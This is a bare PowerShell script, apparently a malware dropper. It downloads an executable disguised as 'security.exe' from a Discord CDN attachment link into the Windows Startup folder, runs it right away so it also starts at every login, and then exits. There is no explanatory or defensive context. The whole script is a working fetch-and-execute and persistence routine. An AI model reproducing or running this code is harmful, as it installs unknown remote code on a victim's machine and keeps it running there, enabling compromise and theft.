$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345420203433001032/security.exe?ex=67c47bb5&is=67c32a35&hm=ce03577fefe476ea38e88e817a5baf13b53944712c96487788cd0180a0e56f14&"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath
& $startupFolder\security.exe
[System.Environment]::Exit(0)
